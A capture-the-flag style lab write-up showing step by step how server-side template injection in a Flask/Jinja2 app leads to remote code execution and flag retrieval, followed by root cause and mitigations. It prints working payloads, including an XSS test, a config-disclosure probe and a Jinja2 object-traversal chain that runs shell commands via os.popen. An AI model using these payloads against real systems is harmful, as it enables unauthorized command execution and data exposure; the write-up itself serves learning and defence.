# 🧨 SSTI Exploitation Writeup (Flask + Jinja2)

## 📌 Overview

This lab demonstrates a **Server-Side Template Injection (SSTI)** vulnerability in a Flask application using the Jinja2 template engine. The goal was to exploit the vulnerability and retrieve the flag from the server.

---

## 🔍 Step 1: Identify Input Reflection

The application had an input field where user input was reflected in the response.

Initial testing:

```
Deep
```

Output:

```
Hello Deep
```

This confirmed that user input is being rendered in the response.

---

## ⚡ Step 2: Test for XSS

```
<script>alert(1)</script>
```

The script executed successfully, confirming a **reflected XSS vulnerability**.
However, this did not solve the lab.

---

## 🧠 Step 3: SSTI Detection

Based on the hint, SSTI payloads were tested:

```
{{7*7}}
```

Output:

```
49
```

✅ This confirmed that the input is being evaluated by a template engine (Jinja2).

---

## 🔎 Step 4: Information Disclosure

To explore server-side objects:

```
{{config.items()}}
```

Output revealed Flask configuration:

```
dict_items([...])
```

This confirmed:

* Backend: Flask
* Template Engine: Jinja2

---

## 💀 Step 5: Achieve Remote Code Execution (RCE)

Using Jinja2 object traversal:

```
{{ cycler.__init__.__globals__.os.popen('ls').read() }}
```

Output:

```
__pycache__ app.py flag requirements.txt
```

This showed that command execution is possible.

---

## 🎯 Step 6: Retrieve the Flag

```
{{ cycler.__init__.__globals__.os.popen('cat flag').read() }}
```

Output:

```
flag{...}
```

✅ Successfully retrieved the flag.

---

## 🔥 Root Cause

The application directly rendered user input as a template:

```python
render_template_string(user_input)
```

This allowed attackers to inject and execute Jinja2 expressions.

---

## ⚠️ Impact

* Arbitrary command execution (RCE)
* Sensitive data exposure
* Full server compromise

---

## 🛡️ Mitigation

* Never render user input directly as templates
* Use safe rendering methods
* Sanitize and validate input
* Disable dangerous template features if possible

---

## 🧠 Key Takeaways

* SSTI is more dangerous than XSS
* Always test template injection when input is reflected
* Jinja2 allows access to Python internals if not sandboxed

---

## 🚀 Conclusion

This lab demonstrates how a simple input reflection can escalate into full server compromise via SSTI. Proper input handling and secure template rendering are critical to prevent such vulnerabilities.
